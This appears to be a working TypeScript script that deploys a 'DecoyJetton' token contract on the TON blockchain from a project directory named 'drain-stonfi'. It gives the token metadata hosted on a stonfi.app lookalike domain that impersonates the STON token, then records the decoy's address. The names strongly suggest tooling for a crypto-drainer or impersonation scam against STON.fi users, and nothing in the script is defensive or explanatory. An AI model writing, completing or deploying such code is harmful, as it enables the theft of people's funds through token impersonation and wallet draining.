import { beginCell, external, internal, storeMessage, toNano } from '@ton/core'
import { mnemonicToPrivateKey } from '@ton/crypto'
import { WalletContractV4 } from '@ton/ton'
import { readFileSync, writeFileSync } from 'fs'
import { DecoyJetton } from './src/server/decoy'

const API = 'https://tonapi.io/v2'
const KEY = process.env.TONAPI_KEY!
const h = { Authorization: 'Bearer ' + KEY, 'Content-Type': 'application/json' }
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))

const j = JSON.parse(readFileSync('/opt/drain-stonfi/src/items/deployer.json', 'utf8'))
const kp = await mnemonicToPrivateKey(j.mnemonic)
const wallet = WalletContractV4.create({ workchain: 0, publicKey: kp.publicKey })
const raw = wallet.address.toRawString()

const content = beginCell().storeUint(1, 8).storeStringTail('https://stonfi.app/jetton/ston.json?v=1').endCell()
const decoy = DecoyJetton.createFromConfig(wallet.address, content)
console.log('master', decoy.address.toString())

const sq: any = await (await fetch(`${API}/blockchain/accounts/${raw}/methods/seqno`, { method: 'POST', headers: h, body: '{"args":[]}' })).json()
const seqno = Number(sq?.stack?.[0]?.num ?? '0x0')
console.log('seqno', seqno)

const tr: any = await wallet.createTransfer({
  seqno,
  secretKey: kp.secretKey,
  sendMode: 3,
  timeout: Math.floor(Date.now() / 1000) + 300,
  messages: [internal({ to: decoy.address, value: toNano('0.12'), bounce: false, init: decoy.init, body: beginCell().endCell() })],
})
const ext = beginCell().storeWritable(storeMessage(external({ to: wallet.address, body: tr }))).endCell()
const r = await fetch(`${API}/blockchain/message`, { method: 'POST', headers: h, body: JSON.stringify({ boc: ext.toBoc().toString('base64') }) })
console.log('send', r.status, (await r.text()).slice(0, 200))
await sleep(12000)
const addr = decoy.address.toString({ bounceable: false, urlSafe: true })
writeFileSync('/opt/drain-stonfi/src/items/decoy.json', JSON.stringify({ address: addr }, null, 2))
console.log('saved', addr)
